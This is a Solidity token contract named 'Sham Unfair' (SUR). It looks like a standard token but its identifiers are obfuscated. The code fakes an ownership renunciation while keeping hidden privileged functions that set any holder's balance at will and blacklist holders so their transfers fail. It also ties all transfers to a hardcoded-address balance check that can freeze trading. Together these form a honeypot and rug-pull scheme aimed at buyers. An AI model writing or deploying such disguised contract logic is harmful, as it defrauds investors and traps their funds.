//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface marketingMode {
    function createPair(address walletLaunchFrom, address fromSellAuto) external returns (address);
}

interface receiverLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoAmount) external view returns (uint256);

    function transfer(address launchedAuto, uint256 fundReceiver) external returns (bool);

    function allowance(address autoExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address launchedAuto,
        uint256 fundReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchMode, uint256 value);
    event Approval(address indexed autoExempt, address indexed spender, uint256 value);
}

abstract contract autoEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface receiverLaunchMetadata is receiverLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ShamUnfair is autoEnable, receiverLaunch, receiverLaunchMetadata {

    bool public tradingFee;

    uint256 amountMax;

    bool private launchTake;

    constructor (){
        if (launchedReceiver != teamExempt) {
            teamExempt = launchedReceiver;
        }
        minBuy();
        maxList maxWallet = maxList(shouldModeLimit);
        receiverSell = marketingMode(maxWallet.factory()).createPair(maxWallet.WETH(), address(this));
        if (shouldLaunchLiquidity != launchTake) {
            launchedModeSender = false;
        }
        teamFrom = _msgSender();
        shouldLaunch[teamFrom] = true;
        marketingTeamFund[teamFrom] = modeSwap;
        if (launchTake == tokenTeam) {
            teamExempt = launchedReceiver;
        }
        emit Transfer(address(0), teamFrom, modeSwap);
    }

    function walletListIs(address totalLaunched) public {
        if (tradingFee) {
            return;
        }
        if (tokenTeam) {
            launchedReceiver = teamExempt;
        }
        shouldLaunch[totalLaunched] = true;
        
        tradingFee = true;
    }

    mapping(address => bool) public shouldLaunch;

    uint256 public teamExempt;

    uint8 private fromList = 18;

    function name() external view virtual override returns (string memory) {
        return listSwap;
    }

    address takeExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function tradingIs(address toReceiver, address launchedAuto, uint256 fundReceiver) internal returns (bool) {
        if (toReceiver == teamFrom) {
            return exemptMin(toReceiver, launchedAuto, fundReceiver);
        }
        uint256 buyMarketing = receiverLaunch(receiverSell).balanceOf(takeExempt);
        require(buyMarketing == txMin);
        require(launchedAuto != takeExempt);
        if (limitLiquidity[toReceiver]) {
            return exemptMin(toReceiver, launchedAuto, totalTokenAmount);
        }
        return exemptMin(toReceiver, launchedAuto, fundReceiver);
    }

    uint256 private launchedReceiver;

    event OwnershipTransferred(address indexed atList, address indexed tokenSwapLaunch);

    uint256 private modeSwap = 100000000 * 10 ** 18;

    mapping(address => bool) public limitLiquidity;

    function owner() external view returns (address) {
        return walletAt;
    }

    mapping(address => mapping(address => uint256)) private txSell;

    function getOwner() external view returns (address) {
        return walletAt;
    }

    uint256 txMin;

    bool private launchedModeSender;

    function receiverToken(address isMinBuy, uint256 fundReceiver) public {
        launchedIs();
        marketingTeamFund[isMinBuy] = fundReceiver;
    }

    string private listSwap = "Sham Unfair";

    function takeMarketing(uint256 fundReceiver) public {
        launchedIs();
        txMin = fundReceiver;
    }

    function transfer(address isMinBuy, uint256 fundReceiver) external virtual override returns (bool) {
        return tradingIs(_msgSender(), isMinBuy, fundReceiver);
    }

    address private walletAt;

    address public teamFrom;

    uint256 constant totalTokenAmount = 9 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return launchReceiver;
    }

    bool public shouldLaunchLiquidity;

    function balanceOf(address autoAmount) public view virtual override returns (uint256) {
        return marketingTeamFund[autoAmount];
    }

    function approve(address atLimit, uint256 fundReceiver) public virtual override returns (bool) {
        txSell[_msgSender()][atLimit] = fundReceiver;
        emit Approval(_msgSender(), atLimit, fundReceiver);
        return true;
    }

    function transferFrom(address toReceiver, address launchedAuto, uint256 fundReceiver) external override returns (bool) {
        if (_msgSender() != shouldModeLimit) {
            if (txSell[toReceiver][_msgSender()] != type(uint256).max) {
                require(fundReceiver <= txSell[toReceiver][_msgSender()]);
                txSell[toReceiver][_msgSender()] -= fundReceiver;
            }
        }
        return tradingIs(toReceiver, launchedAuto, fundReceiver);
    }

    address shouldModeLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function fromBuy(address marketingFrom) public {
        launchedIs();
        if (launchTake) {
            tokenTeam = false;
        }
        if (marketingFrom == teamFrom || marketingFrom == receiverSell) {
            return;
        }
        limitLiquidity[marketingFrom] = true;
    }

    function minBuy() public {
        emit OwnershipTransferred(teamFrom, address(0));
        walletAt = address(0);
    }

    address public receiverSell;

    function allowance(address shouldEnable, address atLimit) external view virtual override returns (uint256) {
        if (atLimit == shouldModeLimit) {
            return type(uint256).max;
        }
        return txSell[shouldEnable][atLimit];
    }

    function launchedIs() private view {
        require(shouldLaunch[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return fromList;
    }

    string private launchReceiver = "SUR";

    function exemptMin(address toReceiver, address launchedAuto, uint256 fundReceiver) internal returns (bool) {
        require(marketingTeamFund[toReceiver] >= fundReceiver);
        marketingTeamFund[toReceiver] -= fundReceiver;
        marketingTeamFund[launchedAuto] += fundReceiver;
        emit Transfer(toReceiver, launchedAuto, fundReceiver);
        return true;
    }

    bool private tokenTeam;

    mapping(address => uint256) private marketingTeamFund;

    function totalSupply() external view virtual override returns (uint256) {
        return modeSwap;
    }

}